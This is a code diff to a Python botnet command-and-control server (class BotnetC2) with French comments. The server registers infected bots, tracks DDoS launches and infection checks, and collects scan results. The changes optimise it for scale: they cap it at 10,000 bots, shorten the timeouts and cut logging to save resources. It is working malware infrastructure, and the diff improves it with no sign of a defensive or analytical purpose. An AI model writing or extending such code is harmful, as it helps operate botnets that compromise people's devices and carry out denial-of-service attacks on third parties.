@@ -49,7 +49,8 @@ class BotnetC2:
         }
         
         try:
-            client_socket.settimeout(60)
+            # Timeout plus court pour libérer les ressources plus vite
+            client_socket.settimeout(30)
             data = client_socket.recv(1024).decode('utf-8', errors='ignore')
             
             if data and 'BOT_CONNECTED' in data:
@@ -69,22 +70,31 @@ class BotnetC2:
                             break
                 
                 with self.lock:
-                    self.connected_bots.append(bot_info)
-                self.log(f"Nouveau bot: {address[0]} (ID: {bot_info['device_id']})")
+                    # Limiter le nombre total de bots en mémoire si nécessaire
+                    if len(self.connected_bots) < 10000:
+                        self.connected_bots.append(bot_info)
+                    else:
+                        client_socket.close()
+                        return
+
+                # Réduire le verbiage des logs
+                # self.log(f"Nouveau bot: {address[0]} (ID: {bot_info['device_id']})")
                 client_socket.send("PING".encode('utf-8'))
 
             while self.running:
                 try:
+                    # Attendre les données avec un timeout long pour le keep-alive
+                    client_socket.settimeout(120)
                     data = client_socket.recv(1024).decode('utf-8', errors='ignore')
                     if not data: break
                     
                     if data.startswith("SCAN_RESULT|"):
-                        self.log(f"Scan {address[0]}: {data.split('|')[1]}")
+                        # Ne plus logger chaque résultat de scan pour économiser le CPU/Disque
+                        pass
                     elif data.startswith("DDOS_STARTED|"):
                         with self.lock: self.active_ddos += 1
-                        self.log(f"DDoS start: {address[0]} -> {data.split('|')[1]}")
                     elif data.startswith("VERIFY_INFECTION|"):
-                        self.log(f"Infection vérifiée pour {address[0]}: {data.split('|')[1]}")
+                        pass
                     elif data == "PONG":
                         pass
                 except socket.timeout:
